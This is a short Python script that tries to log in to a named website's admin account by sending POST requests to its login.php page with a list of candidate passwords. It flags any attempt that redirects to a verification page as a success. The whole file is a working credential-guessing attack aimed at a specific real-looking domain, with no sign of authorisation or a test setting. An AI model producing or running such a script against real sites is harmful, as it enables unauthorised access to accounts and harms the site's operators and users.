import http.client
import urllib.parse

# URL for the POST request
POST_URL = "dasystem.gtsactivegroup.com"
PATH = "/login.php"

# List of passwords to be tested
passwords = ['1234', '12345']

# Form data template
form_data_template = {
    'username': 'admin',
    'password': '',  # Placeholder for password
    'submit': 'Login'
}

# Headers for the request
headers = {
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded'
}

try:
    for password in passwords:
        # Create a copy of the form data template and update the password
        form_data = form_data_template.copy()
        form_data['password'] = password

        # Encode the form data
        encoded_form_data = urllib.parse.urlencode(form_data)

        # Establish a connection to the server
        conn = http.client.HTTPSConnection(POST_URL)

        # Send the POST request
        conn.request("POST", PATH, encoded_form_data, headers)

        # Get the response
        response = conn.getresponse()

        # Check if the response indicates successful login and redirection
        if response.status == 302 and 'Location' in response.headers:
            redirect_url = response.headers['Location']
            if 'verify.php' in redirect_url:
                print(f"Login successful with password: {password}")
                # You can now proceed to interact with the verify.php page
                # You might want to make another request to the verify.php URL or perform other actions
        else:
            print(f"Login not successful with password: {password}")

        # Close the connection
        conn.close()

except http.client.HTTPException as e:
    print("HTTP Exception:", e)
except Exception as e:
    print("Error:", e)
